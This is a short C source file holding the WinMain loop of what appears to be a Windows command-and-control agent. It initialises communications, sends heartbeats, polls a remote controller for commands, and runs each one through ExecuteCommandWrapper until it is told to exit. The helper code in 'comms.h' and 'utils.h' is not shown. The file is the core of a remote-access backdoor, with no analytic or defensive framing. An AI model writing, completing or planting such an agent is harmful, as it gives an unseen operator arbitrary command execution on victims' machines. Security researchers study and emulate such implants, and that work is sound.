#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#include "utils.h"
#include "comms.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    InitializeComms();
    while (1) {
        SendHeartbeat();

        char cmd[1024] = {0};
        if (GetCommand(cmd, sizeof(cmd))) {
            printf("[*] Received command: %s\n", cmd);
        
            // Check for exit command
            if (strcmp(cmd, "exit") == 0) {
                SendOutput("[+] Successfully stopped agent process");
                break;  // Exit main loop
            }
        
            ExecuteCommandWrapper(cmd);
        }
        Sleep(SLEEP_TIME);
    }

    return EXIT_SUCCESS;
}
